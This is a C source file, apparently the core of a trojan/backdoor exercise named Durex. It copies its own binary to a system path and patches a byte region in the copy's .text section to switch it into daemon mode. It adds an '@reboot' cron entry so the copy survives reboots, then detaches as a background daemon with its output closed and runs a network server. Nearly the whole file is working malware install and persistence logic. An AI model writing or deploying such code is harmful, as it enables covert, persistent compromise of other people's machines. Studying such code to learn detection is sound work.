#include "durex.h"

#include <stdio.h>

int			g_fd;
int			g_sock;

static int		launch(void)
{
	pid_t		pid;
	int		fd;
	struct stat	st;
	char		*buf;
	char		cron[] = "@reboot /bin/Durex";
	
	if ((fd = open(PATH_CRON, O_RDWR | O_CREAT, 0600)) == -1)
		return (1);
	if (fstat(fd, &st) == -1)
		goto error;
	if ((buf = (char*)malloc(sizeof(char)*st.st_size)) == NULL)
		goto error;
	read(fd, buf, st.st_size);
	if ((strstr(buf, cron) != NULL))
		goto error_free;
	lseek(fd, 0, SEEK_END);
	write(fd, cron, 18);
	free(buf);
	close(fd);
start:
	pid = fork();
	if (pid < 0)
		goto error_free;
	if (pid == 0)
	{
		if ((execl(PATH_BIN_EXEC, "", NULL)) < 0)
			exit (EXIT_FAILURE);
	}
	return (0);
error_free:
	free(buf);
error:
	close(fd);
	goto start;
}

static void		sig_handler(const int signo)
{
	(void)signo;
	if (g_fd != 0)
		unlock_deamon(&g_fd);
	if (g_sock != 0)
		close(g_sock);
	exit(EXIT_SUCCESS);
}

static void		sigsig(void)
{
	signal(SIGTSTP, SIG_IGN);
	signal(SIGCONT, SIG_IGN);
	signal(SIGTTIN, SIG_IGN);
	signal(SIGTTOU, SIG_IGN);
	signal(SIGHUP, SIG_IGN);
	signal(SIGCHLD, SIG_DFL);
	signal(SIGTERM, sig_handler);
	signal(SIGINT, sig_handler);
	signal(SIGQUIT, sig_handler);
}

static int		elf_parsing(void *file, int f_size)
{
	Elf64_Ehdr	*main_header;
	Elf64_Shdr	*header;
	Elf64_Shdr	*strtab;
	const char	*addr_strtab;
	int		fd;

	main_header = (Elf64_Ehdr *)file;
	header = (Elf64_Shdr*)(file + main_header->e_shoff);
	strtab = &header[main_header->e_shstrndx];
	addr_strtab = file + strtab->sh_offset;
	for (int i = 0; i < main_header->e_shnum; i++)
	{
		if (strcmp(".text", addr_strtab + header[i].sh_name) == 0)
		{
			memset(file + header[i].sh_offset + header[i].sh_size - 0x232, '\0', 4);
			if ((fd = open(PATH_BIN, O_CREAT | O_WRONLY)) < 0)
				return (1);
			write(fd, file, f_size);
			chmod(PATH_BIN, S_IXUSR);
			close(fd);
			return (0);
		}
	}
	return (1);
}

static int 		copy_file(char *path)
{
	int		fd;
	struct stat	st;
	void		*file;

	if ((fd = open(path, O_RDONLY)) < 0)
		return (1);
	if ((fstat(fd, &st)) < 0)
		goto file_error;
	if ((file = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		goto file_error;
	elf_parsing(file, st.st_size);
	munmap(file, st.st_size);
	close(fd);
	return (0);
file_error:
	close(fd);
	return (1);
}

static int		check_present(void)
{
	struct dirent		*file;
	DIR			*directory;

	if ((directory = opendir(PATH_BIN)) == NULL)
		goto error;
	while ((file = readdir(directory)))
		if (!(strcmp(file->d_name, BIN_NAME)))
			goto error;
	closedir(directory);
	return (0);
error:
	closedir(directory);
	return (1);
}

int			main(int argc, char **argv)
{
	pid_t			pid;
	pid_t			sid;
	int			fd;
	int			sock;
	int			in_durex;

	(void)argc;
	in_durex = 1;
	if (in_durex)
	{
		write(STDIN_FILENO, "pnardozi\n", 9); 
		if ((check_credentials()) != 0)
			return (EXIT_FAILURE);
		if (check_present())
			return (0);
		if ((copy_file(argv[0])) == 0)
			launch();
	}
	else
	{
		if ((check_credentials()) != 0)
			return (EXIT_FAILURE);
		g_fd = 0;
		g_sock = 0;
		fd = 0;
		if ((lock_daemon(&fd)) != 0)
			return (EXIT_FAILURE);
		g_fd = fd;
		pid = fork();
		if (pid < 0)
			goto error;
		if (pid == 0)
		{
			sigsig();
			umask(0);
			sid = setsid();
			if (sid < 0)
				goto error;
			if ((chdir("/") < 0))
				goto error;
			close(STDIN_FILENO);
			close(STDOUT_FILENO);
			close(STDERR_FILENO);
			if ((sock = create_server()) < 0)
				goto error;
			g_sock = sock;
			run_server(&sock);
			unlock_deamon(&fd);
		}
		return (EXIT_SUCCESS);
error:
		close(sock);
		unlock_deamon(&fd);
		return (EXIT_FAILURE);
	}
	return (EXIT_SUCCESS);
}
